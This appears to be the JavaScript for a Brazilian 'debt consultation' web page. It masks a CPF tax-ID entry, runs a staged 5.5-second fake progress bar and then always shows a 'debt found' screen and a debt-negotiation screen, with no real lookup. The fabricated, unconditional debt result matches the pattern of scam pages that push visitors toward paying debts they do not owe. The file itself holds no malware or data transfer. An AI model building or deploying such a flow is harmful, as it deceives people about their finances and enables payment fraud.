document.addEventListener('DOMContentLoaded', () => {
    // UI Elements
    const screens = {
        login: document.getElementById('login-screen'),
        dashboard: document.getElementById('dashboard-screen'),
        loading: document.getElementById('loading-screen'),
        debtFound: document.getElementById('debt-found-screen'),
        negotiation: document.getElementById('negotiation-screen')
    };

    const forms = {
        login: document.getElementById('login-form')
    };

    const buttons = {
        consult: document.getElementById('consult-btn'),
        regularize: document.getElementById('regularize-btn')
    };

    const inputs = {
        cpf: document.getElementById('cpf'),
        error: document.getElementById('cpf-error'),
        progress: document.getElementById('loading-progress')
    };

    // CPF Masking Logic
    inputs.cpf.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 11) value = value.slice(0, 11);

        if (value.length > 9) {
            value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
        } else if (value.length > 6) {
            value = value.replace(/^(\d{3})(\d{3})(\d{3}).*/, '$1.$2.$3');
        } else if (value.length > 3) {
            value = value.replace(/^(\d{3})(\d{3}).*/, '$1.$2');
        }

        e.target.value = value;
        inputs.error.textContent = '';
    });

    // Simple Validation
    function isValidCPF(cpf) {
        const cleanCpf = cpf.replace(/[^\d]+/g, '');
        return cleanCpf.length === 11 && !/^(\d)\1+$/.test(cleanCpf);
    }

    // Login Submission
    forms.login.addEventListener('submit', (e) => {
        e.preventDefault();
        if (!isValidCPF(inputs.cpf.value)) {
            inputs.error.textContent = 'Por favor, insira um CPF válido.';
            inputs.cpf.classList.add('invalid');
            return;
        }
        showScreen('dashboard');
    });

    // Consultant Trigger
    buttons.consult.addEventListener('click', () => {
        showScreen('loading');
        startConsultation();
    });

    function startConsultation() {
        let percentage = 0;
        const duration = 5500; // 5.5 seconds
        const intervalTime = 50;
        const step = (intervalTime / duration) * 100;

        const timer = setInterval(() => {
            percentage += step;
            if (percentage >= 100) {
                percentage = 100;
                clearInterval(timer);
                setTimeout(() => showScreen('debtFound'), 500);
            }
            inputs.progress.style.width = percentage + '%';
        }, intervalTime);
    }

    // Regularize Trigger
    buttons.regularize.addEventListener('click', () => {
        showScreen('negotiation');
    });

    // Navigation Helper
    function showScreen(targetKey) {
        Object.values(screens).forEach(screen => {
            if (screen) screen.classList.remove('active');
        });
        if (screens[targetKey]) {
            screens[targetKey].classList.add('active');
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
    }
});
